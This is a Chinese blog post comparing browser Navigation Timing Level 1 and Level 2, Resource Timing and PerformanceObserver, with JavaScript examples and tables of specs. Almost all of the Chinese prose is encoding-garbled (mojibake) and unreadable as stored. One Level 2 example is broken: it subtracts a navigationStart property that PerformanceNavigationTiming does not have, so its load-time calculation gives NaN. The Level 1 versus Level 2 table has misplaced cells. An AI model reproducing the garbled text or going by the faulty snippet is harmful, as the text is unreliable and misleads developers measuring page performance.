<p>éšç§å’Œå®‰å…¨é™åˆ¶</p>
<p>å‡ºäºå®‰å…¨å’Œéšç§è€ƒè™‘ï¼ŒæŸäº›æ—¶é—´ç‚¹åœ¨è·¨åŸŸè¯·æ±‚ä¸­å¯èƒ½ä¸å¯ç”¨ï¼Œå¯¼è‡´æ•°æ®ä¸å®Œæ•´ã€‚</p>
</li>
</ol>
<p>ä¸å¾—ä¸æ‰¿è®¤ï¼ŒLevel 1 æ˜¯ç½‘é¡µæ€§èƒ½æµ‹é‡é¢†åŸŸçš„é‡è¦é‡Œç¨‹ç¢‘ï¼Œå®ƒä¸ºå¼€å‘è€…æä¾›äº†åŸºç¡€ä¸”æ ‡å‡†åŒ–çš„å¯¼èˆªæ—¶é—´æ•°æ®ï¼Œæå¤§åœ°æ¨åŠ¨äº†å‰ç«¯æ€§èƒ½ä¼˜åŒ–çš„å‘å±•ã€‚ä½†éšç€éœ€æ±‚çš„æå‡å’ŒæŠ€æœ¯çš„è¿›æ­¥ï¼ŒLevel 1 çš„åŠŸèƒ½å·²æ˜¾ä¸è¶³ï¼Œå®ƒæ— æ³•å¤„ç†å¤šç§åœºæ™¯ä¸‹çš„å¤æ‚æƒ…å†µï¼Œä½¿ç”¨å®ƒçš„åŒæ—¶<strong>é€šå¸¸è¦ç»“åˆå…¶ä»–æ€§èƒ½APIä¸€èµ·ä½¿ç”¨</strong>ï¼Œè¿™æ ·æ‰å¯ä»¥è·å¾—æ›´å…¨é¢å’Œç²¾ç»†çš„æ€§èƒ½åˆ†æèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æ‰€è°“é•¿æ±Ÿåæµªæ¨å‰æµª ä¸€æµªæ›´æ¯”ä¸€æµªå¼ºï½ Navigation Timing Level 2 åº”è¿è€Œç”Ÿ</p>
</blockquote>
<p>ä¸‹é¢æ˜¯W3Cç¬¬äºŒç‰ˆçš„Navigation Timingçš„å¤„ç†æ¨¡å‹ï¼š</p>
<p>è¯¦æƒ…è§ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3.org%2FTR%2Fnavigation-timing-2%2F" target="_blank" title="https://www.w3.org/TR/navigation-timing-2/" ref="nofollow noopener noreferrer">W3C Navigation Timing Level 2</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d809a2a08a7e4d1780304781aedbe7af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=Op2qQWdNxLtPnOnOPZFSCejmBF0%3D" alt="Clipboard_Screenshot_1765866342.png" loading="lazy"/></p>
<p>Level 2 æ˜¯å¯¹ Level 1 çš„æ‰©å±•å’Œæ”¹è¿›ã€‚</p>
<p>ä»å›¾ä¸­ä¸éš¾çœ‹å‡ºï¼ŒLevel 2 ç›¸è¾ƒäº Level 1 æœ‰æ›´å¤šçš„æ—¶é—´èŠ‚ç‚¹ã€æ›´çµæ´»çš„æ¥å£è®¾è®¡ã€æ›´ä¸°å¯Œçš„æµ‹é‡æŒ‡æ ‡ã€æ›´å¼ºå¤§çš„è·¨åŸŸèµ„æºçš„å¤„ç†ã€æ›´æƒå¨çš„é…è‰²ã€æ›´å…¢å…¢ä¸šä¸šçš„æå‡ºäººå‘˜â€¦</p>
<p>é’ˆå¯¹ Level 1 çš„å±€é™æ€§ï¼ŒLevel 2 åšäº†ä¸€äº›ä¼˜åŒ–ï¼š</p>








































<table><thead><tr><th><strong>Level 1 çš„å±€é™æ€§</strong></th><th><strong>Level 1 çš„å±€é™æ€§ç»†åˆ™</strong></th><th><strong>Level 2 çš„ä¼˜åŒ–</strong></th></tr></thead><tbody><tr><td><strong>æ•°æ®ç²’åº¦æœ‰é™</strong></td><td>æ—¶é—´ç‚¹å¤šï¼Œä½†ç¼ºä¹å¯¹èµ„æºçº§åˆ«å’Œç”¨æˆ·äº¤äº’çš„è¯¦ç»†åº¦é‡ã€‚</td><td/></tr><tr><td>æ—¶é—´ç²¾åº¦<strong>ä»¥æ¯«ç§’ä¸ºå•ä½ã€‚</strong></td><td><strong>æ—¶é—´ç‚¹æ›´ä¸ºä¸°å¯Œï¼ˆ<strong>ç»§æ‰¿äº†<code>Resource Timing</code></strong>ï¼‰ï¼Œæ–¹ä¾¿ç»“åˆç°ä»£ç½‘é¡µè¿›è¡Œæ›´å…¨é¢çš„å‰–æã€‚</strong></td><td/></tr><tr><td>æ—¶é—´ç²¾åº¦<strong>ä»¥å¾®ç§’ä¸ºå•ä½ã€‚</strong></td><td/><td/></tr><tr><td>éœ€è¦ä½¿ç”¨å¤šAPIå¤„ç†åŒä¸€ä¸ªé€»è¾‘</td><td>éœ€è¦ä½¿ç”¨<code>PerformanceTiming</code> å’Œ<code>PerformanceNavigation</code></td><td><strong>å°†æ‰€æœ‰å¯¼èˆªç›¸å…³æŒ‡æ ‡æ•´åˆä¸ºå•ä¸€å¯¹è±¡</strong>ã€‚åªéœ€ä½¿ç”¨<code>PerformanceNavigationTiming</code>å³å¯</td></tr><tr><td><strong>éšç§å’Œå®‰å…¨é™åˆ¶</strong></td><td>è·¨åŸŸè¯·æ±‚ä¸­æŸäº›æ—¶é—´ç‚¹ä¸å¯ç”¨ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®ä¸å®Œæ•´</td><td><strong>å¢å¼ºäº†å¯¹è·¨åŸŸèµ„æºçš„æ€§èƒ½æ•°æ®æš´éœ²æ”¯æŒï¼Œ<strong>åœ¨ä¿éšœéšç§çš„åŒæ—¶</strong>æä¾›äº†æ›´ç²¾ç»†çš„èµ„æºæ•°æ®ç›‘æ§</strong>ï¼Œå‡å°‘æ•°æ®æ³„éœ²çš„é£é™©ã€‚</td></tr><tr><td/><td/><td>æ”¯æŒÂ <code>PerformanceObserver</code>Â ç›‘å¬</td></tr></tbody></table>
<p>Level 1 çš„æ—¶é—´ç²¾åº¦æ˜¯ä»¥æ¯«ç§’ä¸ºå•ä½ï¼ŒåŸºäº<code>Date.now()</code>ï¼Œå¦‚æœä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼Œ<code>Date.now()</code>ä¼šè·Ÿç€å˜åŒ–ï¼›Level 2 æ˜¯åå‰¯å…¶å®çš„é«˜ç²¾åº¦ï¼ˆHigh Resolution Time, HRTimeï¼‰æ—¶é—´ï¼Œæ‰€æœ‰æ—¶é—´æˆ³åŸºäº<code>performance.timeOrigin</code> ï¼Œä»¥å¾®ç§’ç²¾åº¦ä¸ºå‡†ï¼Œ<strong>ä¸ä¼šéšç€ç³»ç»Ÿæ—¶é—´çš„ä¿®æ”¹è€Œå˜åŒ–çš„</strong>ã€‚</p>
<blockquote>
<p>ç”±äºåªåŒ…å«å½“å‰æ–‡æ¡£ï¼Œå› æ­¤é€šå¸¸åªæœ‰ä¸€ä¸ªÂ <code>PerformanceNavigationTiming</code>Â å¯¹è±¡å¯ä¾›è§‚å¯Ÿã€‚å®ƒæ‰©å±•äº†Â <code>PerformanceEntry</code>Â æ¥å£ï¼Œ<code>entryType</code> ä¸ºÂ <code>"navigation"</code>Â ï¼Œå¹¶ä¸”ç»§æ‰¿è‡ª<code>PerformanceEntry</code>å’Œ<code>PerformanceResourceTiming</code>ï¼Œå› æ­¤è·å–æ–‡æ¡£è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨æŒ‡å®š<strong>æ€§èƒ½èµ„æºæ¡ç›®</strong>çš„æ–¹å¼ï¼Œæ‰€æœ‰æ—¶é—´æˆ³ä¹Ÿéƒ½å¯ç”¨ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªå°ä¾‹å­æ¥ç›´è§‚çœ‹å‡ºäºŒè€…ä»ä½¿ç”¨è§’åº¦ä¸Šçš„åŒºåˆ«ï¼š</p>
<p>ç°åœ¨æä¸€ä¸ªæœ€æœ€æœ€ezçš„éœ€æ±‚ï¼šç›‘å¬æµè§ˆå™¨çš„<code>load</code>äº‹ä»¶ï¼Œè®¡ç®—å¹¶æ‰“å°é¡µé¢çš„åŠ è½½æ—¶é—´ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// Level 1</span>
	<span class="hljs-keyword">const</span> timing = <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">timing</span>;
	<span class="hljs-keyword">const</span> loadTime = timing.<span class="hljs-property">loadEventEnd</span> - timing.<span class="hljs-property">navigationStart</span>;
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Level 1 é¡µé¢çš„åŠ è½½æ—¶é—´ä¸ºï¼š'</span>, loadTime, <span class="hljs-string">'ms'</span>);

  <span class="hljs-comment">// Level 2</span>
  <span class="hljs-keyword">const</span> navEntries = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'navigation'</span>);
  <span class="hljs-keyword">if</span> (navEntries.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
	  <span class="hljs-keyword">const</span> navTiming = navEntries[navEntries.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
	  <span class="hljs-keyword">const</span> loadTime2 = navTiming.<span class="hljs-property">loadEventEnd</span> - navTiming.<span class="hljs-property">startTime</span>;
	  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Level 2 é¡µé¢çš„åŠ è½½æ—¶é—´ä¸ºï¼š'</span>, loadTime2, <span class="hljs-string">'ms'</span>);
	}
});
</code></pre>
<blockquote>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦åŒºåˆ†çš„ç‚¹ï¼Œå³ä½¿Level 2 é‡‡ç”¨äº†æ›´é«˜çš„æ—¶é—´ç²¾åº¦ï¼Œæœ€ç»ˆè¾“å‡ºç»“æœä¹Ÿä»ç„¶è½¬æ¢ä¸ºæ¯«ç§’ã€‚<strong>å› ä¸ºæµè§ˆå™¨å†…éƒ¨çš„æ€§èƒ½æ—¶é—´æˆ³é€šå¸¸éƒ½ä½¿ç”¨æ¯«ç§’çº§åˆ«</strong>ã€‚</p>
</blockquote>
<p>ä¸¤æ®µä»£ç å®ç°çš„åŠŸèƒ½æ˜¯ä¸€è‡´çš„ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªç½‘é¡µçš„æ§åˆ¶å°è¿›è¡Œæµ‹è¯•ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecae00cc19a846ec8cfdac24593f2872~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=5bYf55zNjWrYCWyOylGbtfXlbkw%3D" alt="Clipboard_Screenshot_1765866361.png" loading="lazy"/></p>
<p>å¯ä»¥å¾ˆç›´è§‚åœ°çœ‹åˆ°ï¼ŒLevel 2 çš„åŠ è½½æ—¶é—´çš„ç²¾åº¦æ›´åŠ Goodã€‚</p>
<p>ç¨å¾®å¤æ‚ä¸€ç‚¹ç‚¹ï¼ŒLevel 1 å°±æ— æ³•â€åªâ€œä½¿ç”¨<code>PerformanceTiming</code>ç‹¬è‡ªèƒœä»»ã€‚</p>
<p>å‡è®¾ä½ æƒ³<strong>è·å–é¡µé¢åŠ è½½çš„è¯¦ç»†æ—¶é—´</strong>ï¼Œå¹¶ä¸”éœ€è¦çŸ¥é“<strong>é¡µé¢æ˜¯å¦æ˜¯ä»ç¼“å­˜åŠ è½½çš„</strong>ï¼Œä»¥æ­¤æ¥ä¼˜åŒ–æ€§èƒ½ã€‚</p>
<p>åœ¨Level1ä¸­ä½ éœ€è¦å°†<code>PerformanceTiming</code>å’Œ<code>PerformanceNavigation</code>ç»“åˆæ¥ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
	<span class="hljs-comment">// PerformanceTiming</span>
	<span class="hljs-keyword">const</span> timing = <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">timing</span>;
	<span class="hljs-keyword">const</span> loadTime = timing.<span class="hljs-property">loadEventEnd</span> - timing.<span class="hljs-property">navigationStart</span>;
	
	<span class="hljs-comment">// PerformanceNavigation</span>
	<span class="hljs-keyword">const</span> navigation = <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">navigation</span>;
	<span class="hljs-keyword">const</span> isFromCache = navigation.<span class="hljs-property">type</span> === <span class="hljs-variable language_">window</span>.<span class="hljs-property">performance</span>.<span class="hljs-property">navigation</span>.<span class="hljs-property">TYPE_BACK</span>;
	
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`é¡µé¢çš„åŠ è½½æ—¶é—´ä¸º: <span class="hljs-subst">${loadTime}</span>ms`</span>);
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`é¡µé¢æ˜¯å¦ä»ç¼“å­˜åŠ è½½: <span class="hljs-subst">${isFromCache ? <span class="hljs-string">'æ˜¯'</span> : <span class="hljs-string">'å¦'</span>}</span>`</span>);
});
</code></pre>
<p>åœ¨Level2ä¸­ä½ åªéœ€ä½¿ç”¨<code>PerformanceNavigationTiming</code>å³å¯ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
	<span class="hljs-comment">// PerformanceNavigationTiming</span>
	<span class="hljs-keyword">const</span> navigationTiming = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'navigation'</span>)[<span class="hljs-number">0</span>];
	<span class="hljs-keyword">const</span> loadTime = navigationTiming.<span class="hljs-property">loadEventEnd</span> - navigationTiming.<span class="hljs-property">navigationStart</span>;
	<span class="hljs-keyword">const</span> isFromCache = navigationTiming.<span class="hljs-property">type</span> === <span class="hljs-string">'back_forward'</span>;
	
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`é¡µé¢çš„åŠ è½½æ—¶é—´ä¸º: <span class="hljs-subst">${loadTime}</span>ms`</span>);
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`é¡µé¢æ˜¯å¦ä»ç¼“å­˜åŠ è½½: <span class="hljs-subst">${isFromCache ? <span class="hljs-string">'æ˜¯'</span> : <span class="hljs-string">'å¦'</span>}</span>`</span>);
});
</code></pre>
<p>å¾ˆæ˜æ˜¾æœ¬ç€å‡å°‘ä»£ç å¤æ‚çš„è§’åº¦ï¼ŒLevel2æ›´èƒœä¸€ç­¹ã€‚</p>
<p>å†ç¨å¾®å¤æ‚ä¸€ç‚¹ç‚¹ï¼šå‡è®¾æˆ‘ä»¬éœ€è¦<strong>å®æ—¶ç›‘å¬ç”¨æˆ·æ¯æ¬¡é¡µé¢å¯¼èˆªçš„æ€§èƒ½æ•°æ®</strong>ï¼Œ<strong>æ”¶é›†å¾®ç§’çº§åˆ«é«˜ç²¾åº¦çš„åŠ è½½æŒ‡æ ‡</strong>ï¼Œå¹¶<strong>èƒ½åŒºåˆ†å¯¼èˆªç±»å‹</strong>ï¼ˆé¦–æ¬¡æ‰“å¼€ã€åˆ·æ–°ã€è¿”å›ç­‰ï¼‰ã€‚ä¼ ç»Ÿ Level 1 åªèƒ½åœ¨é¡µé¢åŠ è½½å®Œæˆåè·å–ä¸€æ¬¡é™æ€æ•°æ®ï¼Œä¸”æ—¶é—´ç²¾åº¦è¾ƒä½ï¼Œæ— æ³•æ»¡è¶³åœ¨çº¿ç›‘æ§è¦æ±‚ã€‚</p>
<p>åœ¨Level2ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆ<code>PerformanceObserver</code>æ¥ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> navObserver = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> entries = list.<span class="hljs-title function_">getEntries</span>();
  entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'navigation'</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¯¼èˆªç±»å‹:'</span>, entry.<span class="hljs-property">type</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é‡å®šå‘æ¬¡æ•°:'</span>, entry.<span class="hljs-property">redirectCount</span>);

      <span class="hljs-comment">// ç²¾ç¡®å¾®ç§’çº§æ—¶é—´æˆ³</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Fetch Start:'</span>, entry.<span class="hljs-property">fetchStart</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM Interactive:'</span>, entry.<span class="hljs-property">domInteractive</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Load Event End:'</span>, entry.<span class="hljs-property">loadEventEnd</span>);
      <span class="hljs-comment">//...</span>

      <span class="hljs-comment">// å…³é”®æŒ‡æ ‡è®¡ç®—</span>
      <span class="hljs-keyword">const</span> backendTime = entry.<span class="hljs-property">responseStart</span> - entry.<span class="hljs-property">requestStart</span>;
      <span class="hljs-keyword">const</span> frontendTime = entry.<span class="hljs-property">loadEventEnd</span> - entry.<span class="hljs-property">domInteractive</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœåŠ¡å™¨å“åº”æ—¶é—´: <span class="hljs-subst">${backendTime.toFixed(<span class="hljs-number">3</span>)}</span> ms`</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å‰ç«¯å¤„ç†æ—¶é—´: <span class="hljs-subst">${frontendTime.toFixed(<span class="hljs-number">3</span>)}</span> ms`</span>);

      <span class="hljs-comment">// åç»­å¤„ç†...</span>
    }
  });
});

<span class="hljs-comment">// å¼€å§‹ç›‘å¬andç¡®ä¿æ•è·é¡µé¢åŠ è½½å‰çš„è®°å½•</span>
navObserver.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'navigation'</span>], <span class="hljs-attr">buffered</span>: <span class="hljs-literal">true</span> });
</code></pre>
<p>ä¸å¾—å¦è®¤ï¼Œè™½ç„¶ Level 1 å®˜æ–¹å·²ç»ä¸å»ºè®®ä½¿ç”¨äº†ï¼Œä½†æ˜¯æˆ‘ç›¸ä¿¡å¾ˆå¤šé¡¹ç›®è¿˜æ˜¯ä½¿ç”¨çš„ Level 1 æä¾›çš„<code>performance.timing</code> ï¼Œä¸»è¦å°±æ˜¯ä¸¤ç‚¹ï¼š</p>
<ol>
<li>
<p>å…¼å®¹æ€§å¼º</p>
<p>æ¯•ç«ŸH5æ—¶ä»£å°±å­˜åœ¨ï¼Œæ‰€æœ‰ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒ</p>
</li>
<li>
<p>ç®€å•åœºæ™¯ä¸‹ Level 1 è¶³å¤Ÿç”¨äº†</p>
<p>è™½ç„¶<strong>ç²¾åº¦ä½</strong>å¹¶ä¸”æ— æ³•é€šè¿‡<code>PerformanceObserver</code>å®æ—¶ç›‘å¬ï¼Œä½†æ˜¯å·²å­˜çš„å­—æ®µå¯ä»¥æ»¡è¶³å¤§éƒ¨åˆ†éœ€æ±‚ï¼Œå¹¶ä¸”ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½å¯¹â€œç²¾åº¦â€å’Œâ€œå®æ—¶â€è¦æ±‚å¤ªé«˜</p>
</li>
</ol>
<p>æ‰€ä»¥è¯´ï¼Œå³ä½¿ Navigation Timing Level 2 æä¾›äº†æ›´ç²¾ç»†ã€ç»Ÿä¸€çš„æ€§èƒ½æ¡ç›®ç³»ç»Ÿï¼ŒLevel 1 ä»åœ¨è®¸å¤šé¡¹ç›®ä¸­â€œé¡½å¼ºåœ°å­˜æ´»â€ç€ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦å¹¿æ³›å…¼å®¹æ€§å’Œä½ç»´æŠ¤æˆæœ¬çš„åœºæ™¯ä¸‹ã€‚</p>
<p>ä½†æ˜¯è¿™å½±å“ä½ äº†è§£å¹¶ç†ŸçŸ¥ Level 2 å˜›ï¼Ÿæˆ‘è§‰å¾—ä¸ã€‚å¾ˆå¤šçŸ¥è¯†éƒ½é¢ä¸´è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å§‹ç»ˆè§‰å¾—è·Ÿè¿›ç¨å¾®â€œæ–°â€ä¸€äº›çš„ä¸œè¥¿å¹¶æ— åå¤„ï¼Œè‡³å°‘æˆ‘ä»¬èƒ½ä»â€œæ–°â€çš„ä¸œè¥¿ä¸­çŸ¥é“â€œè€â€çš„ä¸œè¥¿å“ªé‡Œæœ‰ä¸€äº›ä¸å¥½çš„åœ°æ–¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“æ‰€è°“â€œæ–°â€ä¸œè¥¿æœ‰ä»€ä¹ˆå¥½çš„åœ°æ–¹ï¼Œè¿™æœ¬æ¥å°±æ˜¯ä¸€ä¸ªä»è€…è§ä»æ™ºè€…è§æ™ºçš„é—®é¢˜ã€‚</p>
<h4 data-id="heading-13">Resource Timing</h4>
<p><strong>Resource Timing</strong> åŒæ ·ä¹Ÿæ˜¯æ€§èƒ½åˆ†æä¸­éå¸¸é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå…è®¸å¼€å‘è€…è¯¦ç»†äº†è§£é¡µé¢ä¸­<strong>å„ç±»èµ„æº</strong>ï¼ˆå¦‚å›¾ç‰‡ã€è„šæœ¬ç­‰ï¼‰çš„åŠ è½½æ€§èƒ½ã€‚å®ƒçš„æ ¸å¿ƒæ¥å£æ˜¯ <code>PerformanceResourceTiming</code>ï¼Œé€šè¿‡ <code>window.performance.getEntriesByType('resource')</code> è·å–ã€‚</p>
<p>è¯¦æƒ…è§ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fw3c.github.io%2Fresource-timing%2F%23attribute-descriptions" target="_blank" title="https://w3c.github.io/resource-timing/#attribute-descriptions" ref="nofollow noopener noreferrer">Resource Timing</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/866ec862b0224e5c9c6a050ffc7fbf48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=JFA7Y9GOUy%2BFFv%2Fob03ptisz6v4%3D" alt="Clipboard_Screenshot_1765866378.png" loading="lazy"/></p>
<p>å®ƒæä¾›äº†è¯¦ç»†çš„èµ„æºåŠ è½½æ€§èƒ½æ•°æ®ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚è¿™ä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿè¯†åˆ«å‡ºå“ªäº›èµ„æºåŠ è½½è¾ƒæ…¢ï¼Œè¿›è€Œé‡‡å–é’ˆå¯¹æ€§çš„ä¼˜åŒ–æªæ–½ã€‚<strong>ä¸ Navigation Timing ç›¸æ¯”ï¼ŒResource Timing èƒ½å¤Ÿæ•è·é¡µé¢ä¸Šæ¯ä¸ªèµ„æºçš„åŠ è½½æ€§èƒ½ï¼Œè€Œä¸ä»…ä»…æ˜¯é¡µé¢æœ¬èº«</strong>ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// è·å–æ‰€æœ‰èµ„æºçš„æ€§èƒ½æ¡ç›®
const <span class="hljs-attr">resources</span> = performance.getEntriesByType(<span class="hljs-string">'resource'</span>)<span class="hljs-comment">;</span>
console.log(resources)<span class="hljs-comment">;</span>
</code></pre>
<p>æ‰“åˆ°æ§åˆ¶å°ä¸­å°±æ˜¯è¿™æ ·çš„æ•ˆæœï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12e9860313534b8dba2a4b2d749858cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=eLlCnKH4o26JYN8fx9MhGyu%2BpuE%3D" alt="Clipboard_Screenshot_1765866389.png" loading="lazy"/></p>
<p>è¿™æ ·å°±å¯ä»¥éå¸¸ç®€æ˜“çš„è·å–åˆ°å„ç±»èµ„æºçš„åŠ è½½ä¿¡æ¯ï¼Œä»¥ä¾¿åç»­çš„ä¸ŠæŠ¥/åˆ†æã€‚</p>
<h4 data-id="heading-14">ç®€åŒ–ç‰ˆæ—¶é—´çº¿ä¸æ ‡å‡†å‘å±•ç®€å›¾</h4>
<p>Performance APIæœ¬èº«çš„APIè§„èŒƒå’Œå¯¹è±¡ç±»å‹/æ¥å£çš„åå­—çœ‹èµ·æ¥æ¯”è¾ƒâ€œæ··ä¹±â€ï¼Œè¿™é‡Œåšä¸€ä¸ªç®€åŒ–ç‰ˆçš„æ—¶é—´çº¿ä¸æ ‡å‡†å‘å±•ç®€å›¾ä¾›ç†è§£å‚è€ƒï¼ˆä¸Šæ–‡æåˆ°çš„ä¸€äº›å·²åŠ ç²—å¤„ç†ï¼‰ï¼š</p>





































<table><thead><tr><th>è§„èŒƒåç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td><strong>Navigation Timing Level 1ï¼ˆ2012ï¼‰</strong></td><td>æä¾› <code>performance.timing</code> ç­‰æ—¶é—´æˆ³å­—æ®µï¼Œæ ¸å¿ƒå…³æ³¨<strong>é¡µé¢åŠ è½½æµç¨‹</strong></td></tr><tr><td>High Resolution Time Level 1ï¼ˆ2012ï¼‰</td><td>å¼•å…¥ <code>performance.now()</code> ç²¾å‡†æ—¶é—´</td></tr><tr><td><strong>Performance Timeline Level 1ï¼ˆ2012ï¼‰</strong></td><td>å®šä¹‰ <code>PerformanceEntry</code> æ¥å£ï¼Œæœ€æ—©å¼•å…¥ <code>performance.getEntries()</code></td></tr><tr><td><strong>Resource Timing Level 1ï¼ˆ2013ï¼‰</strong></td><td>ä½¿ç”¨ <code>performance.getEntriesByType('resource')</code> è·å–èµ„æºåŠ è½½æ€§èƒ½</td></tr><tr><td>User Timing Level 1ï¼ˆ2012ï¼‰</td><td>å¼•å…¥ <code>mark()</code> å’Œ <code>measure()</code> å¹¶å°†å®ƒä»¬ä½œä¸º <code>PerformanceEntry</code> å‡ºç°åœ¨ <code>getEntries()</code> ä¸­</td></tr><tr><td><strong>Navigation Timing Level 2ï¼ˆ2017ï¼‰</strong></td><td>ä½¿ç”¨ <code>PerformanceNavigationTiming</code> æ›¿ä»£è€çš„ <code>performance.timing</code>ï¼Œç»Ÿä¸€çº³å…¥ Timeline</td></tr><tr><td><strong>Performance Timeline Level 2+</strong></td><td>æ”¯æŒ <code>PerformanceObserver</code>ã€buffered ç›‘å¬ç­‰</td></tr></tbody></table>
<p>å†æ¥ä¸€ä¸ªåå­—å¾ˆåƒä½†æ˜¯å¹¶éä¸€æ ·çš„ï¼š</p>



































<table><thead><tr><th/><th>PerformanceTiming</th><th>PerformanceTimeline</th></tr></thead><tbody><tr><td>å®šä¹‰</td><td>ä¸€ä¸ªå¯¹è±¡ç±»å‹/æ¥å£</td><td>ä¸€ä¸ªAPIæ ‡å‡†ä½“ç³»/è§„èŒƒ</td></tr><tr><td>ç”¨é€”</td><td>é¡µé¢åŠ è½½æ—¶é—´æˆ³</td><td>å„ç±»æ€§èƒ½æ¡ç›®ç®¡ç†</td></tr><tr><td>èŒƒå›´</td><td>ä»…é™é¡µé¢åŠ è½½</td><td>åŒ…æ‹¬èµ„æºåŠ è½½ã€ç»˜åˆ¶ã€è‡ªå®šä¹‰æ‰“ç‚¹ã€CLSã€LCP ç­‰</td></tr><tr><td>API</td><td><code>performance.timing</code></td><td><code>getEntries()</code>ã€<code>PerformanceObserver</code></td></tr><tr><td>status</td><td>å·²å­˜åœ¨ä½†<strong>é€æ­¥åºŸå¼ƒä¸­</strong></td><td>å½“å‰æ€§èƒ½ API çš„æ ¸å¿ƒåŸºç¡€</td></tr></tbody></table>
<h3 data-id="heading-15">é¡µé¢æ€§èƒ½ç›‘æ§çš„å¸¸è§æŒ‡æ ‡</h3>
